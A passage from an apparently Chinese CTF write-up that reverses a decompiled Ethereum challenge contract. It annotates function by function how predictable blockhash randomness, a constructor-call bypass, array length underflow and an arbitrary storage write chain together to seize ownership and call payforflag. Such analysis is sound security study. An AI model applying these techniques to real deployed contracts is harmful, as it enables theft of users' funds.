+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sodility">function Deposit() &#123;<br>&#x2F;&#x2F;要求msg.value &gt;&#x3D; 500000000000000000000<br>    if (msg.value &lt; 0x1b1ae4d6e2ef500000) &#123; return; &#125;<br><br>&#x2F;&#x2F;slot[0x05] &#x3D; slot[0x05]  + 0x01<br>    memory[0x00:0x20] &#x3D; msg.sender;<br>    memory[0x20:0x40] &#x3D; 0x05;<br>    var temp0 &#x3D; keccak256(memory[0x00:0x40]);<br>    storage[temp0] &#x3D; storage[temp0] + 0x01;<br>&#125;<br></code></pre></div></td></tr></table></figure></li>
+</ul>
+<h3 id="0x24b04905-gift"><a href="#0x24b04905-gift" class="headerlink" title="0x24b04905 gift()"></a>0x24b04905 gift()</h3><p>函数调用，没啥说的。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">&#125; else <span class="hljs-keyword">if</span> <span class="hljs-comment">(var0 == 0x24b04905)</span> &#123;<br>    <span class="hljs-comment">// Dispatch table entry for gift()</span><br>    var<span class="hljs-number">1</span> = msg.value;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-comment">(var1)</span> &#123; revert<span class="hljs-comment">(memory[0x00:0x00])</span>; &#125;<br><br>    var<span class="hljs-number">1</span> = <span class="hljs-number">0</span>x<span class="hljs-number">01</span>d<span class="hljs-number">5</span>;<br>    gift<span class="hljs-comment">()</span>;<br>    stop<span class="hljs-comment">()</span>;<br></code></pre></div></td></tr></table></figure>
+<p>函数分析</p>
+<ul>
+<li>要求 address(msg.sender).code.length == 0 ，即在合约 constructor 中运行即可</li>
+<li>要求 msg.sender 后三个数为 0x111</li>
+<li>满足上述条件后，storage[0x04] = 100 ， storage[0x05] += 1 ， storage[0x06] += 1<figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function gift() &#123;<br>//要求address(msg.sender).code.length == 0 就是要求在construct构造函数中使用，因为此时没有函数签名了。<br>        var var0 = address(msg.sender).code.length;<br>    <br>        if (var0 != 0x00) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    <br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    //要求 slot<span class="hljs-comment">[0x05]</span> == 0<br>        if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x00) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    //要求msg.sender账户后三位是0x111<br>        if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>        <br>        //slot<span class="hljs-comment">[0x04]</span> = 0x64<br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x04;<br>        storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> = 0x64;<br>        <br>        //slot<span class="hljs-comment">[0x05]</span>=slot<span class="hljs-comment">[0x05]</span> + 1 <br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>        var temp0 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>        storage<span class="hljs-comment">[temp0]</span> = storage<span class="hljs-comment">[temp0]</span> + 0x01;<br>        <br>        //slot<span class="hljs-comment">[0x06]</span> = slot<span class="hljs-comment">[0x06]</span> + 1<br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>        var temp1 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>        storage<span class="hljs-comment">[temp1]</span> = storage<span class="hljs-comment">[temp1]</span> + 0x01;<br>    &#125;<br></code></pre></div></td></tr></table></figure></li>
+</ul>
+<h3 id="0x23de8635-func-06CE-arg0"><a href="#0x23de8635-func-06CE-arg0" class="headerlink" title="0x23de8635 func_06CE(arg0)"></a>0x23de8635 func_06CE(arg0)</h3><p>这个函数逆向稍显复杂，但相应源码其实很短</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Chopping(<span class="hljs-params">uint</span> <span class="hljs-params">_hand</span>)</span> public &#123;<br>    Tmall tmall = <span class="hljs-constructor">Tmall(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>)</span>;<br>    <span class="hljs-keyword">if</span> (!tmall.<span class="hljs-constructor">Chop_hand(<span class="hljs-params">_hand</span>)</span>) &#123;<br>        hand = _hand;<br>        have_chopped = tmall.<span class="hljs-constructor">Chop_hand(<span class="hljs-params">hand</span>)</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>反编译如下，分析都写在注释里面了。所以这个函数最终干了什么呢。</p>
+<ul>
+<li>调用了两次同一个函数0xa8286aca</li>
+<li>第一次调用仅仅就判断了函数的返回值取反之后是满足true还是false，如果通过if判断则会将storage[0x03]赋值为第一次调用0xa8286aca的函数参数，然后第二次调用0xa8286aca函数，并将结果赋值给storage[0x02].</li>
+</ul>
+<p>而在大佬wp里面明显看出来了更多东西。这里有个疑问，是如何确定两次调用函数返回结果不一样的。</p>
+<blockquote>
+<p>总体来看，这里调用了 0xa8286aca 两次，输入同样的参数 arg0 一次， 0xa8286aca 第一次和第二次返回的结果不一样，但是一个 function 当它的参数确定时，他的返回结果也应该是确定的，而不会两次不一样，所以 0xa8286aca 这里应该是一个接口函数，我们是可以改写的，最后改变了 storage[0x02] 的值</p>
+</blockquote>
+<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">function func_06CE(<span class="hljs-keyword">var</span> arg0) &#123;<br>        <span class="hljs-keyword">var</span> var0 = msg.sender;<br>        <span class="hljs-keyword">var</span> var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">var</span> var2 = 0xa8286aca;<br>        <span class="hljs-keyword">var</span> temp0 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>        <br>        <span class="hljs-comment">//将memory[temp0:temp0 + 0x20]设置成了一个函数签名值</span><br>        <span class="hljs-keyword">memory</span>[temp0:temp0 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000;<br>        <span class="hljs-keyword">var</span> temp1 = temp0 + 0x04;<br>        <br>        <span class="hljs-comment">//赋值arg0 ，其实就是调用0xa8286aca函数时的参数。</span><br>        <span class="hljs-keyword">memory</span>[temp1:temp1 + 0x20] = arg0;<br>        <span class="hljs-keyword">var</span> var3 = temp1 + 0x20; <span class="hljs-comment">// memory[0x40:0x60]  + 0x04  + 0x20</span><br>        <span class="hljs-keyword">var</span> var4 = 0x20;<br>        <span class="hljs-keyword">var</span> var5 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>        <span class="hljs-keyword">var</span> var6 = var3 - var5; <span class="hljs-comment">//0x24</span><br>        <span class="hljs-keyword">var</span> var7 = var5; <span class="hljs-comment">//memory[0x40:0x60];</span><br>        <span class="hljs-keyword">var</span> var8 = 0x00;<br>        <span class="hljs-keyword">var</span> var9 = var1; <span class="hljs-comment">//msg.sender</span><br>        <span class="hljs-keyword">var</span> var10 = !address(var9).code.length;<br>    <br>        <span class="hljs-keyword">if</span> (var10) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">var</span> temp2;<br>        <span class="hljs-comment">//调用0xa8286aca函数,temp2用于判断是否调用成功,memory[var5:var5 + var4]存储返回值</span><br>        temp2, <span class="hljs-keyword">memory</span>[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(<span class="hljs-keyword">memory</span>[var7:var7 + var6]);<br>        var4 = !temp2;<br>    <br>        <span class="hljs-comment">//判断是否调用成功</span><br>        <span class="hljs-keyword">if</span> (!var4) &#123;<br>            var1 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>            var2 = returndata.length;<br>        <br>            <span class="hljs-keyword">if</span> (var2 &lt; 0x20) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>        <br>        <span class="hljs-comment">//判断函数返回值是true还是false（不一定就必须返回bool类型）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">memory</span>[var1:var1 + 0x20]) &#123;<br>            label_0850:<br>                <span class="hljs-keyword">return</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//将函数参数赋值给了storage[0x03]</span><br>                storage[0x03] = arg0;<br>                <br><span class="hljs-comment">//下面流程和上面差不多，就是再次调用0xa8286aca这个函数，区别在于最后改变了storage[0x02]的值</span><br>                var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>                var2 = 0xa8286aca;<br>                <span class="hljs-keyword">var</span> temp3 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>                <span class="hljs-keyword">memory</span>[temp3:temp3 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000;<br>                <span class="hljs-keyword">var</span> temp4 = temp3 + 0x04;<br>                <span class="hljs-keyword">memory</span>[temp4:temp4 + 0x20] = storage[0x03];<br>                var3 = temp4 + 0x20;<br>                var4 = 0x20;<br>                var5 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>                var6 = var3 - var5;<br>                var7 = var5;<br>                var8 = 0x00;<br>                var9 = var1;<br>                var10 = !address(var9).code.length;<br>            <br>                <span class="hljs-keyword">if</span> (var10) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>            <br>                <span class="hljs-keyword">var</span> temp5;<br>                temp5, <span class="hljs-keyword">memory</span>[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(<span class="hljs-keyword">memory</span>[var7:var7 + var6]);<br>                var4 = !temp5;<br>            <br>                <span class="hljs-keyword">if</span> (!var4) &#123;<br>                    var1 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>                    var2 = returndata.length;<br>                <br>                    <span class="hljs-keyword">if</span> (var2 &lt; 0x20) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>               <br>               <span class="hljs-comment">//这里看起来很复杂，但其实最终就是storage[0x02]= memory[var1:var1 + 0x20]</span><br>                    storage[0x02] = !!<span class="hljs-keyword">memory</span>[var1:var1 + 0x20] | (storage[0x02] &amp; ~0xff); <br>                    goto label_0850;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">var</span> temp6 = returndata.length;<br>                    <span class="hljs-keyword">memory</span>[0x00:0x00 + temp6] = returndata[0x00:0x00 + temp6];<br>                    revert(<span class="hljs-keyword">memory</span>[0x00:0x00 + returndata.length]);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> temp7 = returndata.length;<br>            <span class="hljs-keyword">memory</span>[0x00:0x00 + temp7] = returndata[0x00:0x00 + temp7];<br>            revert(<span class="hljs-keyword">memory</span>[0x00:0x00 + returndata.length]);<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="0x9189fec1-guess-uint256"><a href="#0x9189fec1-guess-uint256" class="headerlink" title="0x9189fec1 guess(uint256)"></a>0x9189fec1 guess(uint256)</h3><ul>
+<li>首先要求 arg0 == block.blockHash(block.number - 0x01) % 3 ，这个很容易满足，因为利用区块号生成的随机数是可预测的</li>
+<li>满足要求后，<code>storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14 </code>，即 storage[0x00] 的address地址的前一个字节设为1，其实就是bool和address放在一个slot下的情况，这里只改了那个bool值。<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">function guess(<span class="hljs-built_in">var</span> arg0) &#123;<br>    <span class="hljs-built_in">var</span> <span class="hljs-built_in">var1</span> = <span class="hljs-number">0x00</span>;<br>    <span class="hljs-built_in">var</span> var0 = <span class="hljs-built_in">block</span>.blockHash(<span class="hljs-built_in">block</span>.number - <span class="hljs-number">0x01</span>);<br>    <span class="hljs-built_in">var</span> var2 = <span class="hljs-number">0x03</span>;<br>    <span class="hljs-built_in">var</span> var3 = var0;<br>    <br>    <span class="hljs-keyword">if</span> (!var2) &#123; assert(); &#125;<br>    <br>    <span class="hljs-built_in">var1</span> = var3 <span class="hljs-symbol">%</span> var2;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">var1</span> != arg0) &#123; <span class="hljs-built_in">return</span>; &#125;<br>    <br>    storage[<span class="hljs-number">0x00</span>] = (storage[<span class="hljs-number">0x00</span>] &amp; ~(<span class="hljs-number">0xff</span> * <span class="hljs-number">0x0100</span> ** <span class="hljs-number">0x14</span>)) | <span class="hljs-number">0x0100</span> ** <span class="hljs-number">0x14</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="0xa6f2ae3a-buy"><a href="#0xa6f2ae3a-buy" class="headerlink" title="0xa6f2ae3a buy()"></a>0xa6f2ae3a buy()</h3>函数分析,这个函数较容易分析。<blockquote>
+<p>要求 storage[0x06] == 1 ，这些调用 gift() 空投可以完成<br>要求 storage[0x05] == 1 ，这些调用 gift() 空投可以完成<br>要求 storage[0x02] == 1 ，结合 func_06CE 来看，只需使得 0xa8286aca 第二次调用返回 1 即可<br>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 1 ， 要求storage[0x00]的从低位数第21字节 == 0x01 ，这个满足 guess 即可<br>满足上述要求后，storage[0x05] += 1 ，storage[0x06] += 1</p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function buy() &#123;<br><br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    <br>    //要求 storage<span class="hljs-comment">[0x06]</span> == 0x01<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    <br>    //要求storage<span class="hljs-comment">[0x05]</span> == 0x01<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    //要求storage<span class="hljs-comment">[0x02]</span> == 0x01<br>    if (!!(storage<span class="hljs-comment">[0x02]</span> &amp; 0xff) != !!0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    //要求storage<span class="hljs-comment">[0x00]</span>的从低位数第21字节 == 0x01<br>    if (!!(storage<span class="hljs-comment">[0x00]</span> / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    var temp0 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>    // storage<span class="hljs-comment">[0x05]</span> = storage<span class="hljs-comment">[0x05]</span> + 0x01<br>    storage<span class="hljs-comment">[temp0]</span> = storage<span class="hljs-comment">[temp0]</span> + 0x01;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    var temp1 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>   // storage<span class="hljs-comment">[0x06]</span> = storage<span class="hljs-comment">[0x06]</span> + 0x01<br>    storage<span class="hljs-comment">[temp1]</span> = storage<span class="hljs-comment">[temp1]</span> + 0x01;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="0x47f57b32-retract"><a href="#0x47f57b32-retract" class="headerlink" title="0x47f57b32 retract()"></a>0x47f57b32 retract()</h3><blockquote>
+<p>要求 storage[0x01] == 0 （这里的storage[0x01]就是codex.length）<br>要求 storage[0x05] == 0x02 ，调用 gift 后，再调用 buy 即可<br>要求 storage[0x06] == 0x02 ，调用 gift 后，再调用 buy 即可<br>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 其实就是从低位开始第21字节前二十字节应该是一个address类型变量，这个满足 guess 即可<br>满足上述要求之后，storage[0x01] -= 0x1 ，这里应该是修改数组的长度</p>
+</blockquote>
+<figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function retract() &#123;<br>    if (storage<span class="hljs-comment">[0x01]</span> != 0x00) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    //要求 storage<span class="hljs-comment">[0x05]</span> == 0x02<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x02) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    //要求 storage<span class="hljs-comment">[0x06]</span> == 0x02<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x02) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    if (!!(storage<span class="hljs-comment">[0x00]</span> / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    var var0 = storage<span class="hljs-comment">[0x01]</span> - 0x01;<br>    var var1 = 0x0cf4;<br>    var var2 = 0x01;<br>    var var3 = var0;<br>    func_1489(var2, var3);<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="0x0339f300-revise-uint256-bytes32"><a href="#0x0339f300-revise-uint256-bytes32" class="headerlink" title="0x0339f300 revise(uint256,bytes32)"></a>0x0339f300 revise(uint256,bytes32)</h3><p>剩下得几个函数分析和上面的差不多。</p>
+<p>这个函数有一个最主要的漏洞就是能够覆盖任意的storage值，payforflag那个函数是我们最终需要调用的，但那个函数要求<code>msg.sender == storage[0x00]</code>，所以这里就能利用这个函数覆盖掉storage[0x00]为msg.sender。</p>
+<blockquote>
+<p>要求 storage[0x05] == 0x02 ，<br>要求 storage[0x06] == 0x02 ，<br>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 ，这个满足 guess 即可<br>要求 arg0 &gt;= storage[0x01]<br>满足上述要求后，后面进行了 storage 写操作，这里是任意写操作，可以看代码的注释，因为写入storage的位置可控了<br>然后判断 storage[0x01] &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000 ，经过 retract() 后即可满足,如果不满足则<code>storage[0x06] = storage[0x06] + 0x01;</code></p>
+</blockquote>
+<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">function revise(<span class="hljs-keyword">var</span> arg0, <span class="hljs-keyword">var</span> arg1) &#123;<br>    <span class="hljs-keyword">if</span> (storage[0x01] &lt; 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">memory</span>[0x00:0x20] = msg.sender;<br>    <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x05;<br>    <br>    <span class="hljs-keyword">if</span> (storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] != 0x02) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">memory</span>[0x00:0x20] = msg.sender;<br>    <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x06;<br>    <br>    <span class="hljs-keyword">if</span> (storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] != 0x02) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">if</span> (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">var</span> var0 = arg1;<br>    <span class="hljs-keyword">var</span> var1 = 0x01;<br>    <span class="hljs-keyword">var</span> var2 = arg0;<br>    <br>    <span class="hljs-keyword">if</span> (var2 &gt;= storage[var1]) &#123; <span class="hljs-keyword">assert</span>(); &#125;<br>    <br>    <span class="hljs-keyword">memory</span>[0x00:0x20] = var1; <span class="hljs-comment">//0x01</span><br>    <span class="hljs-comment">//这里就是一个漏洞点了，因为var2是我们传入的参数arg0，意味着写入storage的位置我们可控，所以就可能存在slot内容覆盖了。</span><br>    storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x20]) + var2] = var0;<br>    <br>    <span class="hljs-keyword">if</span> (storage[0x01] &gt;= 0xffffffffff000000000000000000000000000000000000000000000000000000) &#123;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = msg.sender;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x06;<br>        <span class="hljs-keyword">var</span> temp0 = keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40]);<br>        storage[temp0] = storage[temp0] + 0x01;<br>        <span class="hljs-keyword">return</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        var0 = 0x00;<br>        var1 = 0x0676;<br>        var2 = 0x01;<br>        <span class="hljs-keyword">var</span> var3 = var0;<br>        func_1489(var2, var3);<br>        revert(<span class="hljs-keyword">memory</span>[0x00:0x00]);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="0xa9059cbb-transfer-address-uint256"><a href="#0xa9059cbb-transfer-address-uint256" class="headerlink" title="0xa9059cbb transfer(address,uint256)"></a>0xa9059cbb transfer(address,uint256)</h3><p>这里是进行 storage[0x04] 之间的转账操作，一般这种转账涉及变量就类似    <code>mapping (address =&gt; uint) public balanceOf;</code>这种</p>
